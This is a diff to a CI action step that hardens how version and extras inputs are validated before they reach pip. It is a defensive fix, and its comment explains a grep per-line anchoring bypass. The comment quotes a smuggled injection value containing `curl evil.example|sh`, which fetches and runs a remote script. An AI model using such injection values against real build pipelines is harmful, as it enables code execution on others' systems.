@@ -40,16 +40,32 @@ runs:
       # a version specifier and an extras list have a form, and anything outside it is
       # refused rather than passed to pip. Without it, this step would be secure only for
       # as long as nobody rewrites it.
+      #
+      # THE CHECK ANCHORS TO THE WHOLE VALUE, and the first version of it did not. It read
+      # `printf '%s' "$PB_VERSION" | grep -Eq '^...$'`, and grep anchors per LINE: a value whose
+      # FIRST line matches passes, whatever stands below it. Measured, not assumed — with
+      # PB_VERSION set to `==1.0.0` followed by a newline and `"; curl evil.example|sh #`, that
+      # form returned 0 and let the value through, while the same pattern under a whole-string
+      # matcher rejects it. Bash `[[ =~ ]]` matches the whole string, which is the form the
+      # sibling step in .github/workflows/reusable-build-attest.yml already uses for its digest.
+      #
+      # The extras pattern now requires each name to START with an alphanumeric. The first one
+      # allowed a leading hyphen, so `-e` and `eval,--no-deps` passed a check meant to admit
+      # package extras. Neither is exploitable here, because the value only ever reaches pip
+      # inside one quoted argument and pip rejects it — but a check that admits what it exists to
+      # refuse is a check one refactor away from mattering.
       env:
         PB_VERSION: ${{ inputs.version }}
         PB_EXTRAS: ${{ inputs.extras }}
       run: |
         set -euo pipefail
-        if [ -n "$PB_VERSION" ] && ! printf '%s' "$PB_VERSION" | grep -Eq '^[=<>!~]{1,2}[A-Za-z0-9._*+!-]+$'; then
+        PB_VERSION_RE='^[=<>!~]{1,2}[A-Za-z0-9._*+!-]+$'
+        PB_EXTRAS_RE='^[A-Za-z0-9][A-Za-z0-9._-]*(,[A-Za-z0-9][A-Za-z0-9._-]*)*$'
+        if [ -n "$PB_VERSION" ] && ! [[ "$PB_VERSION" =~ $PB_VERSION_RE ]]; then
           echo "::error::version input is not a PEP 440 specifier: refusing to pass it to pip" >&2
           exit 1
         fi
-        if [ -n "$PB_EXTRAS" ] && ! printf '%s' "$PB_EXTRAS" | grep -Eq '^[A-Za-z0-9._-]+(,[A-Za-z0-9._-]+)*$'; then
+        if [ -n "$PB_EXTRAS" ] && ! [[ "$PB_EXTRAS" =~ $PB_EXTRAS_RE ]]; then
           echo "::error::extras input is not a comma-separated list of names: refusing" >&2
           exit 1
         fi
